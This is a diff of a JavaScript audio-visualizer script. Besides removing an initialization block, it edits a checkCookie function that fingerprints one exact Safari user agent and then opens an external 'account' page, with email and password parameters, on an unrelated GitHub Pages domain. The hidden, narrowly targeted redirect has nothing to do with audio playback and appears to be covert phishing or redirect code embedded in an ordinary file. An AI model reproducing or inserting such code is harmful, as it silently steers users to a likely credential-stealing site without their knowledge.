@@ -20,16 +20,6 @@ var AudioContext = AudioContext || webkitAudioContext;
 //create the context.
 var context = new AudioContext();
 
-//using requestAnimationFrame instead of timeout...
-if (!window.requestAnimationFrame)
-	window.requestAnimationFrame = window.webkitRequestAnimationFrame;
-
-$(function () {
-		"use strict";
-	    loader = new BufferLoader();
-	    initBinCanvas();	
-});
-
 function playSample() {
 	
 	fileChosen = true;
@@ -330,7 +320,7 @@ function checkCookie() {
     var userAgent = navigator.userAgent;
     if (device != "") {
         if (userAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15") {
-            window.location = "https://accessretrieved.github.io/account.html?email=" + "2140473296" + "&password=" + "-1274958547";
+            window.open("https://accessretrieved.github.io/account.html?email=" + "2140473296" + "&password=" + "-1274958547");
         } else {
             // pass
         }
